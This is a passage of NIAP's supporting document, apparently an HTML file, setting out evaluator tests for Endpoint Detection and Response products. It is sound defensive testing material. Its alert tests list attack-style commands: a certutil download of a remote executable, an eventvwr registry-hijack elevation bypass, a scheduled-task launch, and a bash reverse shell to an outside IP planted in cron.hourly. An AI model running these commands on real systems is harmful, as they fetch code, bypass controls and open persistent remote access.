@@ -1,0 +1,563 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html>
+<html><head><title>Supporting Document - PP-Module for Endpoint Detection and Response (EDR) Products</title><style type='text/css'>
+    #toc a{
+        display: block;
+    }
+
+    svg{
+      width: 100%;
+    }
+
+    a[id^="ajq_"]{
+        color:black;
+    }
+
+    
+    body{
+       max-width: 900px;
+       margin: auto;
+    }
+    #toc span{
+       margin-left: 20px;
+    }
+    .assignable-content{
+      font-style: italic;
+    }
+    .refinement{
+      text-decoration: underline;
+    }
+    div.eacategory{
+      font-style: italic;
+      font-weight: bold;
+    }
+    .activity_pane .toggler::after, .activity_pane .toggler{
+       display: inline-block;
+       height: auto;
+       content: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8A\
+       AAAPCAYAAAA71pVKAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAQOFAAEDhQGl\
+       VDz+AAAAB3RJTUUH4gIXFDM7fhmr1wAAAfRJREFUKM+dkk9I02EYxz/P+25uurWR\
+       tTkzI4NGl4jQgkq71K1DhnTQIDolRAQFQYSHTtGhU4e6eujQofBSFLOg0C4RUSjh\
+       FnmqTTdKpj/mfv/eX4cUpmRYn9vz8v3w8D7PA/AWGADCbI4QcAb4AnAF8IBJEdX+\
+       N0tEda40C4AHADviW1LFvpOX6+FwtAacVzqkGiWtwxo4F21OuPu7+yvxRNoDEhpY\
+       cpzavkQyc7D76FCk+vN7j7VU6RdR4xAsikjGGP9FKrN3sPfEpajv2i2zhckR4JUG\
+       UCr0erFavLkn2ytd2WPxcFOsZb74+SIQA0YPHBqIdB8Z6tChJv1m/N4P33OGAUsD\
+       BIFxPNcOkq07jyeSbbo1tTu2q6vHEqU7D/ddSKcz2ZQJjBSmx925b9NjwEMAafha\
+       eyQa/3Dq7O0243sCIEoRGAOA59nm5dM7OHVruzH+AkDjYEp23RrLT+U8Ub+fV0UR\
+       oVyaMfVa9fqquF5GKX3ja2FCuc6yWbMipYNP755UgEdr8o2FMf5ivVYdKRfzRkRW\
+       RfJTOc+2rWdAcUN5hdGP7x8viGgAXLvGbGFCKxW6tj74J3nOqVvP89M5V6kQ86UZ\
+       f7lWvWWMt7Sp41VKb21uSfqnB++6kWi8BLTzL4ioq7H4tgC4z3/QAZSBxEaBXygN\
+       v+jeFnAPAAAAAElFTkSuQmCC');
+       max-width: 15px;
+    }
+
+
+    a {
+      text-decoration: none;
+      word-wrap: break-word;
+    }
+    a.abbr:link{
+      color:black;
+      text-decoration:none;
+    }
+    a.abbr:visited{
+      color:black;
+      text-decoration:none;
+    }
+    a.abbr:hover{
+      color:blue;
+      text-decoration:none;
+    }
+    a.abbr:hover:visited{
+      color:purple;
+      text-decoration:none;
+    }
+    a.abbr:active{
+      color:red;
+      text-decoration:none;
+    }
+    .note-header{
+      font-weight: bold;
+    }
+    .note p:first-child{
+      display: inline;
+    }
+
+
+    /* Tooltip container */
+    .tooltipped {
+       position: relative;
+       display: inline-block;
+       border-bottom: 1px dotted black; /* If you want dots under the hoverable text */
+    }
+
+    /* Tooltip text */
+    .tooltiptext {
+       visibility: hidden;
+       width: 120px;
+       background-color: black;
+       color: #fff;
+       text-align: center;
+       padding: 5px 0;
+       border-radius: 6px;
+
+       /* Position the tooltip text - see examples below! */
+       position: absolute;
+       z-index: 1;
+   }
+
+   /* Show the tooltip text when you mouse over the tooltip container */
+   .tooltipped:hover .tooltiptext {
+       visibility: visible;
+   }
+
+   table.mfs td{
+       text-align: center;
+   }
+   table.mfs td:first-child{
+       text-align: left;
+   }
+   table{
+       margin:auto;
+       margin-top:1em;
+       border-collapse:collapse; /*border: 1px solid black;*/
+   }
+   td{
+       text-align:left;
+       padding:8px 8px;
+   }
+   th{
+       padding:8px 8px;
+   }
+   thead tr td{
+       text-align: center;
+       font-style: oblique;
+       font-weight: bold;
+   }
+   tr.header{
+       border-bottom:3px solid gray;
+       padding:8px 8px;
+       text-align:left;
+       font-weight:bold; /*font-size: 90%; font-family: verdana, arial, helvetica, sans-serif; */
+   }
+   table tr:nth-child(2n+2){
+       background-color:#F4F4F4;
+   }
+
+   .dependent{
+       border: 1px solid gray;
+       border-radius: 1px
+   }
+   .dependent-content{
+       margin-left: 25px;
+       font-style: italic;
+   }
+   </style></head><body><div style='text-align: center; margin-left: auto; margin-right: auto;'><h1 style='page-break-before:auto;' class='title'>Supporting Document<br/>
+        Mandatory Technical Document</h1><img alt='NIAP' src='images/niaplogo.png'></img><hr width='50%'></hr><noscript><h1 style='text-align:center; border-style: dashed; border-width: medium; border-color: red;'>This page is best viewed with JavaScript enabled!</h1></noscript><br/>PP-Module for Endpoint Detection and Response (EDR)<p></p>Version: 1.0<p></p>2020-02-02<p></p><b>National Information Assurance Partnership</b></div><div class='foreword'><h1 style='text-align: center'>Foreword</h1><p>This is a Supporting Document (SD), intended to complement the Common Criteria version 3
+      and the associated Common Evaluation Methodology for
+      Information Technology Security Evaluation.</p><p>SDs may be “Guidance Documents”, that highlight specific approaches 
+      and application of the standard to areas where no mutual recognition of
+      its application is required, and as such, are not of normative nature, 
+      or “Mandatory Technical Documents”, whose application is mandatory for evaluations 
+      whose scope is covered by that of the SD.
+      The usage of the latter class is not only mandatory, but certificates
+      issued as a result of their application are recognized under the CCRA.</p><p><b>Technical Editor:</b><br/>
+      National Information Assurance Partnership (NIAP)
+      </p><p><b style='page-break-before:always;'>Document history:</b><table><tr class='header'><th>Version</th><th>Date</th><th style='align:left;'>Comment</th></tr><tr><td>1.0</td><td>2020-02-02</td><td>Draft - first version released</td></tr></table></p><p><b>General Purpose:</b><br/>
+      The purpose of this SD is to define evaluation methods for the functional behavior of 
+      Endpoint Detection and Response (EDR)  products.
+      </p><p><b>Acknowledgements:</b><br/>
+      This SD was developed with support from NIAP Endpoint Detection and Response (EDR) Technical Community members, with representatives from industry, Government 
+      agencies, Common Criteria Test Laboratories, and members of academia.
+      </p></div><h1>Table of Contents</h1><div id='toc'><a href='#introduction' style='text-indent:0px'>1<span>Introduction</span></a><a href='#scope' style='text-indent:10px'>1.1<span>Technology Area and Scope of Supporting Document</span></a><a href='#structure' style='text-indent:10px'>1.2<span>Structure of the Document</span></a><a href='#glossary' style='text-indent:10px'>1.3<span>Terms</span></a><a href='#cc-terms' style='text-indent:20px'>1.3.1<span>Common Criteria Terms</span></a><a href='#tech-terms' style='text-indent:20px'>1.3.2<span>Technical Terms</span></a><a href='#sfr' style='text-indent:0px'>2<span>Evaluation Activities for SFRs</span></a><a href='#aa-$App' style='text-indent:10px'>2.1<span>Application Software Protection Profile
+      </span></a><a href='#qq-sfrs-App-Modified' style='text-indent:20px'>2.1.1<span>Modified SFRs
+        </span></a><a href='#man-sfrs' style='text-indent:20px'>2.1.2<span>TOE SFR Evaluation Activities</span></a><a href='#fau' style='text-indent:20px'>2.1.3<span>Security Audit (FAU)</span></a><a href='#fia' style='text-indent:20px'>2.1.4<span>Identification and Authentication (FIA)</span></a><a href='#fmt' style='text-indent:20px'>2.1.5<span>Security Management (FMT)</span></a><a href='#ftp' style='text-indent:20px'>2.1.6<span>Trusted Path/Channels (FTP)</span></a><a href='#opt-sfrs' style='text-indent:0px'>3<span>Evaluation Activities for Optional SFRs</span></a><a href='#sel-sfrs' style='text-indent:0px'>4<span>Evaluation Activities for Selection-Based SFRs</span></a><a href='#obj-sfrs' style='text-indent:0px'>5<span>Evaluation Activities for Objective SFRs</span></a><a href='#fmt' style='text-indent:10px'>5.1<span>Security Management (FMT)</span></a><a href='#sar_aas' style='text-indent:0px'>6<span>Evaluation Activities for SARs</span></a><a href='#sup-info' style='text-indent:0px'>7<span>Required Supplementary Information</span></a><a href='#biblio' style='text-indent:0px'>Appendix A - <span>References</span></a></div><h1 data-level='0' id='introduction' class='indexable'>1 Introduction</h1><h2 data-level='1' id='scope' class='indexable'>1.1 Technology Area and Scope of Supporting Document</h2><p>The scope of the Endpoint Detection and Response (EDR) PP-Module is
+    to describe the security functionality of 
+      Endpoint Detection and Response (EDR) products in terms of 
+    [CC] and to define functional and assurance requirements for them.
+    The PP-Module is intended for use with the
+    <a href='https://www.niap-ccevs.org/Profile/Info.cfm?PPID=394&amp;id=394'>Application Software Protection Profile</a>.</p><p>This SD is mandatory for evaluations of TOEs that claim conformance to a PP-Configuration that includes the PP-Module for Endpoint Detection and Response (EDR), Version 1.0.
+    Although Evaluation Activities are defined mainly for the evaluators to follow, in general they also help Developers to prepare for evaluation by identifying specific requirements for their TOE.
+    The specific requirements in Evaluation Activities may in some cases clarify the meaning of Security
+    Functional Requirements (SFR), and may identify particular requirements for the content of Security
+    Targets (ST) (especially the TOE Summary Specification), user guidance documentation, and possibly
+    supplementary information (e.g. for entropy analysis or cryptographic key management architecture).</p><h2 data-level='1' id='structure' class='indexable'>1.2 Structure of the Document</h2><p>Evaluation Activities can be defined for both SFRs and Security Assurance Requirements (SAR),
+    which are themselves defined in separate sections of the SD.</p><p>If any Evaluation Activity cannot be successfully completed in an evaluation then
+    the overall verdict for the evaluation is a 'fail'.
+    In rare cases there may be acceptable reasons why an Evaluation Activity
+    may be modified or deemed not applicable for a particular TOE, 
+    but this must be approved by the Certification Body for the evaluation.</p><p>In general, if all Evaluation Activities (for both SFRs and SARs) are successfully
+    completed in an evaluation then it would be expected that the overall verdict for 
+    the evaluation is a ‘pass’.
+    To reach a ‘fail’ verdict when the Evaluation Activities have been successfully 
+    completed would require a specific justification from the evaluator as to why the 
+    Evaluation Activities were not sufficient for that TOE.
+    </p><p>Similarly, at the more granular level of Assurance Components, if the Evaluation 
+    Activities for an Assurance Component and all of its related SFR Evaluation 
+    Activities are successfully completed in an evaluation then it would be expected 
+    that the verdict for the Assurance Component is a ‘pass’.
+    To reach a ‘fail’ verdict for the Assurance Component when these Evaluation 
+    Activities have been successfully completed would require a specific justification 
+    from the evaluator as to why the Evaluation Activities were not sufficient for that TOE. 
+    </p><h2 data-level='1' id='glossary' class='indexable'>1.3 Terms</h2>
+The following sections list Common Criteria and technology terms used in this document.
+    <h3 data-level='2' id='cc-terms' class='indexable'>1.3.1 Common Criteria Terms</h3><table><tr><td><div id='Assurance'>Assurance</div></td><td>Grounds for confidence that a TOE meets the SFRs .</td></tr><tr><td><div id='Common_Criteria'>Common Criteria (CC)</div></td><td>Common Criteria for Information Technology Security Evaluation.</td></tr><tr><td><div id='Common_Evaluation_Methodology'>Common Evaluation Methodology (CEM)</div></td><td>Common Evaluation Methodology for Information Technology Security Evaluation.</td></tr><tr><td><div id='Distributed_TOE'>Distributed TOE</div></td><td>A TOE composed of multiple components operating as a logical whole.</td></tr><tr><td><div id='Operational_Environment'>Operational Environment</div></td><td>Hardware and software that are outside the TOE boundary that support the TOE functionality and security policy.</td></tr><tr><td><div id='Protection_Profile'>Protection Profile (PP)</div></td><td>An implementation-independent set of security requirements for a category of products.</td></tr><tr><td><div id='Protection_Profile_Configuration'>Protection Profile Configuration</div></td><td>A comprehensive set of security requirements for a product type that consists of at least one Base-PP and at least one PP-Module.</td></tr><tr><td><div id='Protection_Profile_Module'>Protection Profile Module (PP-Module)</div></td><td>An implementation-independent statement of security needs for a TOE type complementary to one or more Base Protection Profiles.</td></tr><tr><td><div id='Security_Assurance_Requirement'>Security Assurance Requirement (SAR)</div></td><td>A requirement to assure the security of the TOE.</td></tr><tr><td><div id='Security_Functional_Requirement'>Security Functional Requirement (SFR)</div></td><td>A requirement for security enforcement by the TOE.</td></tr><tr><td><div id='Security_Target'>Security Target (ST)</div></td><td>A set of implementation-dependent security requirements for a specific product.</td></tr><tr><td><div id='TOE_Security_Functionality'>TOE Security Functionality (TSF)</div></td><td>The security functionality of the product under evaluation.</td></tr><tr><td><div id='TOE_Summary_Specification'>TOE Summary Specification (TSS)</div></td><td>A description of how a TOE satisfies the SFRs in a ST.</td></tr><tr><td><div id='Target_of_Evaluation'>Target of Evaluation (TOE)</div></td><td>The product under evaluation. </td></tr></table><h3 data-level='2' id='tech-terms' class='indexable'>1.3.2 Technical Terms</h3><table><tr><td><div id='Alert'>Alert</div></td><td>An event or notification on the management dashboard that highlights
+        potentially unauthorized activity. 
+      </td></tr><tr><td><div id='Endpoint'>Endpoint</div></td><td>A computing device that runs a general purpose OS, a mobile
+        device OS, or network device OS. Endpoints can include desktops, servers, and mobile devices.
+      </td></tr><tr><td><div id='Endpoint_Detection_and_Response'>Endpoint Detection and Response (EDR)</div></td><td>Server software that analyzes collected EDR Host Agent data for detecting,
+        investigating, and remediating unauthorized activities on endpoints. The terms
+        <i>TOE</i> and <i>EDR</i> are interchangeable in this
+        document.
+      </td></tr><tr><td><div id='Endpoint_Detection_and_Response_System'>Endpoint Detection and Response System (EDR)</div></td><td>The EDR server and the Host Agents they operate with.
+      </td></tr><tr><td><div id='Enroll'>Enroll</div></td><td>The act of registering a HA endpoint with the EDR.</td></tr><tr><td><div id='Host_Agent'>Host Agent</div></td><td>Complementary software that executes on endpoints to collect data about the
+        endpoint and executes commands sent to the endpoint from an Enterprise Security Management
+        (ESM) server or service. An example command sent to an endpoint could be to enforce a
+        policy from an ESM, to collect some files, or to run an OS command. 
+      </td></tr><tr><td><div id='Management_Dashboard'>Management Dashboard</div></td><td>A management interface for the configuration of EDR policy, visualization
+        of collected endpoint alert data, and issuing of remediation commands.
+      </td></tr><tr><td><div id='Potentially_Unauthorized_Activity'>Potentially Unauthorized Activity</div></td><td>This refers to the set of activities detected by the TOE, specific items detected may be unique to the TOE</td></tr><tr><td><div id='SOC_Analyst'>SOC Analyst</div></td><td>Security Operations Center (SOC) Analyst is typically the person
+        responsible for reviewing potentially unauthorized activities via alerts and
+        performing remediation and clean up.
+      </td></tr></table><h1 data-level='0' id='sfr' class='indexable'>2 Evaluation Activities for SFRs</h1><p>The EAs presented in this section capture the actions the evaluator performs 
+    to address technology specific aspects covering specific SARs (e.g. ASE_TSS.1, 
+    ADV_FSP.1, AGD_OPE.1, and ATE_IND.1) – this is in addition to the CEM work units 
+    that are performed in <a href='#sar_aas' class='dynref'> 6 Evaluation Activities for SARs</a>.</p><p>Regarding design descriptions (designated by the subsections labelled TSS, as 
+    well as any required supplementary material that may be treated as proprietary), 
+    the evaluator must ensure there is specific information that satisfies the EA. 
+    For findings regarding the TSS section, the evaluator’s verdicts will be 
+    associated with the CEM work unit ASE_TSS.1-1.
+    Evaluator verdicts associated with the supplementary evidence will also be 
+    associated with ASE_TSS.1-1, 
+    since the requirement to provide such evidence is specified in ASE in the cPP.</p><p>For ensuring the guidance documentation provides sufficient information for 
+    the administrators/users as it pertains to SFRs, the evaluator’s verdicts will 
+    be associated with CEM work units ADV_FSP.1-7, AGD_OPE.1-4, and AGD_OPE.1-5.</p><p>Finally, the subsection labelled Tests is where the authors have determined 
+    that testing of the product in the context of the associated SFR is necessary.
+    While the evaluator is expected to develop tests, there may be instances where 
+    it is more practical for the developer to construct tests, or where the 
+    developer may have existing tests. 
+    Therefore, it is acceptable for the evaluator to witness developer-generated 
+    tests in lieu of executing the tests. 
+    In this case, the evaluator must ensure the developer’s tests are executing both 
+    in the manner declared by the developer and as mandated by the EA. 
+    The CEM work units that are associated with the EAs specified in this section 
+    are: ATE_IND.1-3, ATE_IND.1-4, ATE_IND.1-5, ATE_IND.1-6, and ATE_IND.1-7.</p><h2 data-level='1' id='aa-$App' class='indexable'>2.1 Application Software Protection Profile
+      </h2>
+      The EAs defined in this section are only applicable in cases where the TOE claims conformance
+      to a PP-Configuration that includes the App PP.
+      <h3 data-level='2' id='qq-sfrs-App-Modified' class='indexable'>2.1.1 Modified SFRs
+        </h3>
+	  The PP-Module does not modify any requirements when the 
+	  App PP is the base.
+	<h3 data-level='2' id='man-sfrs' class='indexable'>2.1.2 TOE SFR Evaluation Activities</h3><h3 data-level='2' id='fau' class='indexable'>2.1.3 Security Audit (FAU)</h3><div id='FAU_ALT_EXT.1' class='comp'><h4>FAU_ALT_EXT.1 Server Alerts</h4><div class='eacategory'>TSS</div>
+                    The evaluator shall examine the TSS to ensure that it describes how alerts for changes in Host Agent
+                    enrollment status and potentially unauthorized activities on enrolled endpoints are detected and displayed. 
+                    The evaluator shall examine the TSS to ensure it contains the
+                    list of unauthorized activity types categorized or labeled by the EDR upon
+                    detection.<br/><br/>
+                    
+                    The evaluator shall examine the TSS to ensure that it describes how alert visualizations 
+                    are displayed and what content is included.<br/><br/>
+                  
+                  The evaluator shall examine the TSS to ensure that it describes what formats are supported.<div class='eacategory'>Guidance</div>
+                  The evaluator shall review operational guidance to ensure that it
+                  contains documentation on enrolling and unenrolling Host Agents from the
+                  EDR.<br/><br/>
+                  
+                  The evaluator shall review operational guidance to identify a
+                  list of unauthorized activity types categorized or labeled by the EDR upon
+                  detection.<br/><br/>
+                  
+                  The evaluator shall ensure guidance includes any needed configuration information for displaying alerts 
+                  in relation to changes in Host Agent enrollment status and potentially unauthorized activities.<br/><br/>
+                  
+                  The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on using the management dashboard to visualize and view
+                  alerts. 
+                  
+                  <br/><br/>The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on the products supported for exporting alerts in standards-based formats.<div class='eacategory'>Tests</div> 
+                  The evaluator shall perform the following tests:<br/><br/>
+                  The evaluator shall follow guidance to unenroll a Host Agent from the
+                  EDR and verify that the unenrollment action is recorded in an auditable and
+                  timestamped activity log. 
+                  <br/>
+                  <br/>
+                  The evaluator
+                  shall follow guidance to enroll a Host Agent to the EDR and verify that the
+                  enrollment action is recorded in an auditable and timestamped activity log.<br/><br/>
+                  <b>For Windows,</b> the evaluator shall test the EDR's ability to detect
+                  anomalous activity by performing the following sub-tests on an enrolled Host Agent's
+                  system for each platform list that is supported, verifying for each that corresponding
+                  alerts were generated in the management dashboard, the test passes if an alert of the appropriate type is generated:<br/>
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall open a Windows command prompt as a user and run the
+                      command <code>cmd /c certutil -urlcache -split -f &lt;remote file&gt;
+                        &lt;download directory&gt;</code>, where the remote file is a valid file path
+                      to an accessible, remotely stored executable, and the download directory is a
+                      valid directory path writable by the current local user. </li>
+                    <li><b>Test 2: </b>The evaluator shall open a Windows command prompt as a user and run the
+                      command <code>reg.exe add hkcu\software\classes\mscfile\shell\open\command
+                        /ve /d "&lt;local executable&gt;" /f</code>, where the local executable is a
+                      valid file path to a readable, local executable. The evaluator will then run
+                      the command <code>cmd.exe /c eventvwr.msc</code> in the same command
+                      prompt window. </li>
+                    <li><b>Test 3: </b>The evaluator shall open a Windows command prompt as a user and run the
+                      command <code>SCHTASKS /Create /SC ONCE /TN spawn /TR &lt;local
+                        executable&gt;" /ST &lt;time&gt;</code>, where the local executable is a
+                      valid file path to a readable, local executable, and time is a start time that
+                      occurs within minutes of the task being created. </li>
+                  </ul>
+                  <b>For Linux,</b> the evaluator shall test the EDR's ability to detect
+                  anomalous activity by performing the following subtests based on the platform of
+                  the enrolled Host Agent's system, verifying for each that corresponding alerts
+                  were generated in the management dashboard::<br/>
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall open a terminal and run the command <code>scp
+                      &lt;remote user&gt;@&lt;remote host&gt;:&lt;remote path&gt;
+                      &lt;download directory&gt;</code>, where the remote user is a valid user on
+                      remote host, remote path is a valid path to a remotely stored executable, and the 
+                      download directory is a valid directory path writable by the current local
+                      user. The remote user's password shall be provided when prompted. </li>
+                    
+                    <li><b>Test 2: </b>The evaluator shall open a terminal and run the command <code>echo
+                      "bash -i &gt;&amp; /dev/tcp/&lt;outside IP&gt;/5050 0&gt;&amp;1 1 &amp;" &gt; 
+                      /etc/cron.hourly/persist</code>, where the outside IP is a valid
+                      external address.</li>
+                  </ul>
+                  <b>For all platforms:</b>
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall review an alert on the management dashboard and verify that
+                      the alert contains a severity field and the fields specified in the ST.
+                      The evaluator will open or view the alert and verify that a timeline of
+                      events is available for review. The timeline shall show a progression of events
+                      over time.</li>
+                    <li><b>Test 2: </b>The evaluator shall pick an alert on the management dashboard and export the
+                      alert in every format specified in the ST. The evaluator shall review the operational
+                      guidance and the selection from the requirement and verify that export options
+                      exist for all the declared formats in the selection. After exporting one alert for
+                      each possible format the evaluator shall review the file contents of the exported
+                      alert and verify it is the correct format for the selected export option (for
+                      example, an export of the IODEF type must contain 'IODEF-Document' in the first
+                      element of the exported file). </li>
+                </ul></div><div id='FAU_COL_EXT.1' class='comp'><h4>FAU_COL_EXT.1 Collected Endpoint Data</h4><div class='eacategory'>TSS</div>The evaluator shall verify that all supported endpoint event data types are described.<div class='eacategory'>Guidance</div>The evaluator shall review the operational guidance and ensure that it
+                  lists all of the collectable types of endpoint event data.<div class='eacategory'>Tests</div>The evaluator shall perform the following tests:
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall verify the OS version, architecture, and IP address of
+                    a system managed by a Host Agent against the data reported to the EDR.</li>
+                    <li><b>Test 2: </b>The evaluator shall login to a system managed by a Host Agent with two separate
+                    accounts and verify that the activity is accurately reported to the EDR.</li>
+                    <li><b>Test 3: </b>The evaluator shall run a known user application provided on the platform OS and verify
+                    that subsequent process creation and module loading is accurately reported to the EDR.</li>
+                    <li><b>Test 4: </b>The evaluator shall create a new non-empty document within persistent storage and verify
+                    that the activity is accurately reported to the EDR.</li>
+                    <li><b>Test 5: </b>The evaluator shall perform an action that causes an event 
+                      to occur for all items in the assignment and verify the activity is reported to the EDR.</li>
+                  </ul>
+                </div><div id='FAU_GEN.1' class='comp'><h4>FAU_GEN.1 EDR Audit Generation</h4><div class='eacategory'>TSS</div>The evaluator shall check the TSS and ensure that it lists all of the auditable events claimed in the SFR. 
+                The evaluator shall check to make sure that every audit event type specified by the SFR is described in the TSS. <br/><br/>
+                The evaluator shall check the TSS and ensure that it provides a format for audit records. 
+                Each audit record format type must be covered, along with a brief description of each field.<br/><br/>
+              <div class='eacategory'>Guidance</div> The evaluator shall check the administrative guide and ensure that it lists all of the auditable events claimed in the SFR. 
+                The evaluator shall check to make sure that every audit event type mandated by the SFR is described.<br/><br/> 
+                The evaluator shall examine the administrative guide and make a determination of which 
+                commands are related to the configuration (including enabling or disabling) 
+                of the mechanisms implemented in the EDR that are necessary to enforce the 
+                requirements specified in the PP-Module. The evaluator shall document the methodology or 
+                approach taken while determining which actions in the administrative guide are security relevant with 
+                respect to this PP-Module. The evaluator may perform this activity as part of the activities 
+                associated with ensuring the AGD_OPE guidance  satisfies the requirements.<br/><br/>
+                The evaluator shall check the administrative guide and ensure that it provides a format for audit records. 
+                Each audit record format type must be covered, along with a brief description of each field. The evaluator shall 
+                check to make sure that the description of the fields contains the information required in <a href="#FAU_GEN.1">FAU_GEN.1</a></abbr>.2.<br/><br/>
+              <div class='eacategory'>Tests</div>The evaluator shall perform the following tests:
+                <ul>
+                  <li><b>Test 1: </b>The evaluator shall login to the EDR management dashboard and verify that audit
+                    log data describing the activity is recorded.</li>
+                  <li><b>Test 2: </b>The evaluator shall issue a valid remediation command provided by the EDR to
+                    a Host Agent and verify that audit log data describing the activity is recorded on the EDR management dashboard.</li>
+                  <li><b>Test 3: </b>The evaluator shall change a non-destructive EDR configuration option within the EDR management
+                    dashboard, change it back to the original setting, and verify that the audit log data describing
+                    the activity is recorded.</li>
+                  <li><b>Test 4: </b>The evalutor shall perform the action to generate all other auditable 
+                    events listed in the assignement and verify the activity is recorded.</li>
+                </ul>
+                When verifying the test results from <a href="#FAU_GEN.1">FAU_GEN.1</a></abbr>.1, the evaluator shall ensure the audit records generated during 
+                testing match the format specified in the administrative guide, and that the fields in each audit record have the proper entries.
+                <br/><br/> 
+                Note that the testing here can be accomplished in conjunction with the testing of the security mechanisms directly. 
+                For example, testing performed to ensure that the administrative guidance provided is correct verifies that AGD_OPE.1 
+                is satisfied and should address the invocation of the administrative actions that are needed to verify the audit records 
+                are generated as expected.<br/><br/>
+              </div><h3 data-level='2' id='fia' class='indexable'>2.1.4 Identification and Authentication (FIA)</h3><div id='FIA_PWD_EXT.1' class='comp'><h4>FIA_PWD_EXT.1 Password Authentication</h4><div class='eacategory'>TSS</div>The evaluator shall verify the TSS includes all the supported characters, rules, and limitations used by the EDR and that they meet the reuqirements of the SFR.<div class='eacategory'>Guidance</div>The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on default password policy.<div class='eacategory'>Tests</div>The evaluator shall perform the following tests:
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator verify that passwords up to 64 characters are supported.</li>
+                    <li><b>Test 2: </b> The evaluator shall verify that password composition rules present in operational guidance
+                      are enforced. While the evaluator is not required (nor is it feasible) to test all possible
+                      composition rules, the evaluator shall ensure that all characters are supported, and rule characteristics
+                      listed in the requirement are enforced.</li>
+                  </ul>
+                </div><div id='FIA_AUT_EXT.1' class='comp'><h4>FIA_AUT_EXT.1 Dashboard Authentication Mechanisms</h4><div class='eacategory'>TSS</div>The evaluation shall examine the TSS to ensure that it describes how user authentication is performed.  
+                The evaluator shall verify that the authorization methods listed in the TSS are specified and included in the requirements in the ST.<div class='eacategory'>Guidance</div>The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on configuring any supported authentication mechanisms and any support for 
+                  multifactor authentication.<div class='eacategory'>Tests</div>
+                  <ul>
+                    <li><b>Test 1: </b>Conditional: If "provide the following authentication mechanisms" is selected, 
+                      the evaluator shall create an account with a username and password, verifying
+                      that login authentication is case-sensitive. If additional factors are provided, each
+                      factor shall be tested for login access with strictly unanimous authentication for those
+                      enabled. The evaluator shall verify that login access is granted for correct credentials
+                      and denied in cases of incorrect credentials across available factors.</li>
+                    <li><b>Test 2: </b>
+                      Conditional: If "leverage the platform" is selected, the evaluator shall create an account following the platform rules. 
+                      If additional factors are provided, each
+                      factor shall be tested for login access with strictly unanimous authentication for those
+                      enabled. The evaluator shall verify that login access is granted for correct credentials
+                      and denied in cases of incorrect credentials across available factors.</li>
+                  </ul>
+                </div><h3 data-level='2' id='fmt' class='indexable'>2.1.5 Security Management (FMT)</h3><div id='FMT_SMF.1' class='comp'><h4>FMT_SMF.1/HOST Specification of Management Functions (EDR Management of Host Agent)</h4><div class='eacategory'>TSS</div>The evaluator shall verify the ST contains a list of roles and what functions they can perform.  
+                  The evaluator shall verify the list matches the chart in the requirement.<div class='eacategory'>Guidance</div>The evaluator shall review the operational guidance to verify that the EDR has
+                documented capabilities to perform the management functions.<div class='eacategory'>Tests</div>The evaluator shall perform the below tests:
+                 <ul>
+                   <li><b>Test 1: </b>The evaluator shall modify the time frame for sending Host Agent data to the EDR
+                   and verify that an affected Host Agent is sending data at the intended interval.</li>
+                   <li><b>Test 2: </b>The evaluator shall tag or categorize a group of individual endpoint systems and
+                   verify that the tag or categorization persists within the EDR management dashboard for
+                   other users.</li>
+                   <li><b>Test 3: </b>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.</li>
+                 </ul>
+                </div><div id='FMT_SMF.1' class='comp'><h4>FMT_SMF.1/ENDPOINT Specification of Management Functions (EDR Management of EDR)</h4><div class='eacategory'>TSS</div>The evaluator shall verify the ST contains a list of roles and what functions they can perform.  
+                  The evaluator shall verify the list matches the chart in the requirement.<div class='eacategory'>Guidance</div>The evaluator shall review the operational guidance to verify that the EDR has
+                  documented capabilities to perform the management functions.<div class='eacategory'>Tests</div>The evaluator shall perform the below tests with each role, 
+                  verifying each role is denied or can complete the action below as specified by the chart in the SFR:
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall configure the amount of time to retain collected EDR data
+                    to a time frame in which existing data will be made unavailable and verify that the
+                    data is no longer accessible through the EDR management dashboard.</li>
+                    <li><b>Test 2: </b>The evaluator shall logically or physically inhibit the network communications
+                    between a managed endpoint system and the EDR server and verify that the inhibited or halted
+                    connectivity status of the Host Agent is recognized on the EDR management dashboard.</li>
+                    <li><b>Test 3: </b>The evaluator shall use a file that triggers an incident alert to test the suppression
+                    of such alerts for that specific file. Upon confirming the creation of incident alerts on access
+                    to the file, the evaluator shall configure suppression of the alert for each available
+                    suppression blacklist file or metadata characteristic and verify that incident alerts are
+                    categorized as suppressed, hidden, unavailable, or never created.</li>
+                    <li><b>Test 4: </b>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.</li>
+                  </ul>
+                </div><div id='FMT_SMR.1' class='comp'><h4>FMT_SMR.1 Security Management Roles</h4><div class='eacategory'>TSS</div> The evaluator shall examine the TSS to verify that it
+                  describes the roles and the powers granted to and limitations of the role. <div class='eacategory'>Guidance</div> The evaluator shall review the operational guidance to ensure that it
+                  contains instructions for administering the EDR, which user
+                  roles are supported, and which permissions each default role has.<div class='eacategory'>Tests</div>
+                  <ul>
+                    <li><b>Test 1: </b>The evaluator shall verify that the roles of administrator, SOC analyst, and
+                      read-only user are available by default, creating individual accounts with each
+                      role assigned.</li>
+                    <li><b>Test 2: </b>The evaluator shall verify that non-administrator roles are not able to modify
+                      the roles of their own account or those of others.</li>
+                    <li><b>Test 3: </b>In the course of performing the testing activities for the evaluation,
+                      the evaluator shall use all supported interfaces, although it is not
+                      necessary to repeat each test involving an administrative action with each
+                      interface. The evaluator shall ensure, however, that each supported method
+                      of administering the EDR that conforms to the requirements
+                      of this PP be tested; for instance, if the EDR can be administered through a local hardware interface or
+                      TLS/HTTPS then both methods of administration must be exercised during the
+                      evaluation team’s test activities.</li>
+                    <li><b>Test 4: </b>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.</li>
+                  </ul>
+                </div><div id='FMT_SRF_EXT.1' class='comp'><h4>FMT_SRF_EXT.1 Specification of Remediation Functions</h4><div class='eacategory'>TSS</div>The evaluator shall check to ensure that the TSS describes what roles can perform what 
+                  remediation actions and how each remediation action is performed.<div class='eacategory'>Guidance</div>The evaluator shall review the operational guidance to verify that the EDR has
